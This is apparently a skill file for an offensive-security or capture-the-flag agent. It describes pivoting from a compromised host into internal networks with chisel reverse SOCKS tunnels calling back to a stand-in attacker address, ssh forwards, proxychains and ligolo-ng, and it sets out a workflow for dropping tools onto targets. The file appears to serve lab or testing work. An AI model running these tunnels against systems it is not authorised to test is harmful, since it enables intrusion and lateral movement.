---
name: pivoting
description: How to pivot/tunnel from a compromised host to reach internal networks (SOCKS, port forwarding, chisel, ligolo, proxychains, ssh). Use after foothold when the box has an internal target.
---

# Pivoting & tunnels

Reference: `kb-internal` `redteam/pivoting/network-pivoting-techniques.md` and
`network-pivoting-tools.md`; `kb-recipes` `infra/pivoting/port-forwarding.md`
and `socks-proxy.md`.

## When to pivot

- The box has a second NIC / internal route, or you find a service only reachable
  from the compromised host (e.g. `127.0.0.1:PORT`, or a `172.x`/`10.x` target).
- Common trigger: `ip a`, `ss -ltnp`, `cat /etc/hosts`, or an internal hostname
  in the app config.

## Tools & patterns

- **SOCKS proxy** (route many tools through the pivot):
  - `chisel server -p 9001 --reverse` on attacker; `chisel client ATTNIP:9001 R:socks` on target.
  - then `proxychains4 <tool>` (edit `/etc/proxychains4.conf` to `socks5 127.0.0.1 1080`).
- **Single-port forward**:
  - `ssh -L local:remote:port user@host` (if SSH creds), or `ssh -D 1080`.
  - chisel `R:LPORT:RHOST:RPORT`, ligolo-ng (`ligolo` + `proxy` + `tun_sd`), `socat`, `netsh` (Windows).
- **Dynamic/relay chains**: `proxychains` + chisel/ligolo nesting for multi-hop.

## Workflow

1. From the compromised shell, inspect network (`ip a`, `ss -ltnp`, routes) to
   find internal targets/services.
2. Choose the tunnel type based on what's available on the target (chisel/ligolo
   are single-binary Go tools — easy to drop; `ssh -D` needs no extra binary).
3. Bring the tool onto the target (see the `shell` skill for file transfer),
   start the tunnel, and verify reachability with `curl`/`nmap -Pn` through
   proxychains.
4. Run subsequent recon/exploit (e.g. `ad-enum`/`ad-exploit` or a new `recon`
   pass) against the newly reachable target.
5. Record the tunnel setup (commands + ports) in `notes.md`.
